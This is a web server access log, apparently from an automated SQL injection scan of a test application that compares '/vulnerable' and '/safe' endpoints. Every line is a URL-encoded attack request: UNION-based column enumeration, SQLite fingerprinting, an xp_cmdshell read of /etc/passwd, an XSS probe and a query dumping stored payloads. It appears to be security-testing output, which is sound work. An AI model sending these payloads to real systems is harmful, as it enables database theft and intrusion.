02/Oct/2026 16:42:29 "GET /vulnerable/plain?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:29 "GET /vulnerable/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:29 "GET /safe/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:29 "GET /vulnerable/plain?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:29 "GET /vulnerable/plain?id=2&Xiie=2788%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%29%2C%2C%28%29%22%29%27.%29 HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%27CNGPEM%3C%27%22%3E%29CAXVii HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%29%20AND%208537%3D6831%20AND%20%285837%3D5837 HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%29%20AND%208631%3D8631%20AND%20%284144%3D4144 HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20AND%206050%3D5912 HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20AND%208631%3D8631 HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20AND%202500%3D2144 HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%201--%20SMCH HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%206242--%20PWjK HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%2010--%20krgi HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%206--%20Nfoa HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%204--%20XCCC HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%203--%20hTYv HTTP/1.1" 500 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20ORDER%20BY%202--%20AnFE HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7CCHAR%2886%2C108%2C119%2C79%2C102%2C81%2C87%2C116%2C72%2C114%2C104%2C72%2C109%2C76%2C122%2C119%2C74%2C115%2C117%2C114%2C79%2C72%2C66%2C79%2C88%2C76%2C106%2C77%2C99%2C104%2C73%2C83%2C72%2C112%2C99%2C110%2C80%2C121%2C65%2C78%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20mNXF HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7CCHAR%2886%2C108%2C119%2C79%2C102%2C81%2C87%2C116%2C72%2C114%2C104%2C72%2C109%2C76%2C122%2C119%2C74%2C115%2C117%2C114%2C79%2C72%2C66%2C79%2C88%2C76%2C106%2C77%2C99%2C104%2C73%2C83%2C72%2C112%2C99%2C110%2C80%2C121%2C65%2C78%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7CCHAR%28115%2C109%2C89%2C103%2C107%2C99%2C78%2C89%2C73%2C101%2C116%2C119%2C108%2C71%2C109%2C98%2C81%2C72%2C116%2C87%2C80%2C71%2C98%2C71%2C98%2C100%2C86%2C116%2C114%2C83%2C107%2C109%2C102%2C113%2C90%2C65%2C100%2C76%2C87%2C98%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20tyhL HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7CCHAR%2886%2C108%2C119%2C79%2C102%2C81%2C87%2C116%2C72%2C114%2C104%2C72%2C109%2C76%2C122%2C119%2C74%2C115%2C117%2C114%2C79%2C72%2C66%2C79%2C88%2C76%2C106%2C77%2C99%2C104%2C73%2C83%2C72%2C112%2C99%2C110%2C80%2C121%2C65%2C78%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29%20FROM%20%28SELECT%200%20AS%20chYA%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20ZiWh--%20gXmM HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285412%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%205412%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20Crws HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20FcyF HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20XWkk HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28RANDOMBLOB%28-1%29%20IS%20NOT%20NULL%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29--%20lEYM HTTP/1.1" 200 -
02/Oct/2026 16:42:30 "GET /vulnerable/plain?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C112%2C107%2C107%2C113%29%7C%7CJSON_GROUP_ARRAY%28COALESCE%28hex%28payload%29%2CCHAR%2832%29%29%29%7C%7CCHAR%28113%2C122%2C107%2C107%2C113%29%20FROM%20day_entries%20WHERE%20id%3D1--%20eHlZ HTTP/1.1" 200 -
02/Oct/2026 16:42:31 "GET /vulnerable/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2&RprN=4285%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%22%28%29.%28%28%28.%27%28 HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%27DZXBJX%3C%27%22%3E%29hwraUM HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%29%20AND%204928%3D2882%20AND%20%286206%3D6206 HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%29%20AND%201450%3D1450%20AND%20%284985%3D4985 HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20AND%208459%3D5976 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20AND%201450%3D1450 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20AND%202996%3D9001 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%201--%20aJiG HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%204208--%20xWfp HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%2010--%20myso HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%206--%20NmgF HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%204--%20rwOn HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%203--%20CzxN HTTP/1.1" 500 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20ORDER%20BY%202--%20dOaE HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7CCHAR%2885%2C88%2C69%2C105%2C70%2C85%2C88%2C73%2C115%2C79%2C98%2C66%2C83%2C69%2C117%2C103%2C117%2C122%2C107%2C68%2C83%2C86%2C90%2C115%2C120%2C79%2C120%2C67%2C118%2C101%2C89%2C102%2C81%2C74%2C67%2C68%2C103%2C81%2C113%2C103%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20aafI HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7CCHAR%2885%2C88%2C69%2C105%2C70%2C85%2C88%2C73%2C115%2C79%2C98%2C66%2C83%2C69%2C117%2C103%2C117%2C122%2C107%2C68%2C83%2C86%2C90%2C115%2C120%2C79%2C120%2C67%2C118%2C101%2C89%2C102%2C81%2C74%2C67%2C68%2C103%2C81%2C113%2C103%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7CCHAR%28115%2C109%2C107%2C84%2C107%2C81%2C107%2C103%2C107%2C90%2C110%2C109%2C116%2C112%2C86%2C87%2C66%2C81%2C103%2C80%2C118%2C77%2C118%2C118%2C66%2C121%2C73%2C108%2C122%2C118%2C68%2C70%2C116%2C81%2C115%2C106%2C122%2C87%2C102%2C98%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20YUWc HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7CCHAR%2885%2C88%2C69%2C105%2C70%2C85%2C88%2C73%2C115%2C79%2C98%2C66%2C83%2C69%2C117%2C103%2C117%2C122%2C107%2C68%2C83%2C86%2C90%2C115%2C120%2C79%2C120%2C67%2C118%2C101%2C89%2C102%2C81%2C74%2C67%2C68%2C103%2C81%2C113%2C103%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29%20FROM%20%28SELECT%200%20AS%20UmEU%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20nGoz--%20Ddds HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281743%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%201743%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20JdtF HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20JwCD HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20FSki HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28RANDOMBLOB%28-1%29%20IS%20NOT%20NULL%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29--%20GVIO HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /vulnerable/encrypted?id=2%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%2C106%2C118%2C98%2C113%29%7C%7CJSON_GROUP_ARRAY%28COALESCE%28hex%28payload%29%2CCHAR%2832%29%29%29%7C%7CCHAR%28113%2C107%2C106%2C122%2C113%29%20FROM%20day_entries%20WHERE%20id%3D1--%20rzig HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /safe/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:41 "GET /safe/encrypted?id=2&IcoY=8707%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%28%2C%27%29%28%22.%29%2C. HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27oAjVJz%3C%27%22%3E%29ryCwxb HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%29%20AND%203215%3D5557%20AND%20%284515%3D4515 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%29%20AND%203384%3D3384%20AND%20%284321%3D4321 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20AND%203270%3D9978 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20AND%203384%3D3384 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20AND%201434%3D3019--%20lLJJ HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20AND%203384%3D3384--%20pAUc HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%29%20AND%205208%3D5640%20AND%20%28%27GJMe%27%3D%27GJMe HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%29%20AND%203384%3D3384%20AND%20%28%27uvyy%27%3D%27uvyy HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%20AND%209143%3D7162%20AND%20%27vyqQ%27%3D%27vyqQ HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%20AND%203384%3D3384%20AND%20%27uGlX%27%3D%27uGlX HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=%28SELECT%20%28CASE%20WHEN%20%287255%3D6914%29%20THEN%202%20ELSE%20%28SELECT%206914%20UNION%20SELECT%206541%29%20END%29%29 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=%28SELECT%20%28CASE%20WHEN%20%281854%3D1854%29%20THEN%202%20ELSE%20%28SELECT%206238%20UNION%20SELECT%205518%29%20END%29%29 HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%29%20ORDER%20BY%201--%20mdaD HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%29%20ORDER%20BY%204225--%20uFIl HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20ORDER%20BY%201--%20Sjqf HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20ORDER%20BY%204101--%20TUeV HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20ORDER%20BY%201--%20JmNd HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%20ORDER%20BY%201567--%20oHfF HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%29%20ORDER%20BY%201--%20bSlq HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%29%20ORDER%20BY%203536--%20Wnio HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%20ORDER%20BY%201--%20EKEP HTTP/1.1" 200 -
02/Oct/2026 16:42:42 "GET /safe/encrypted?id=2%27%20ORDER%20BY%209645--%20wfPW HTTP/1.1" 200 -
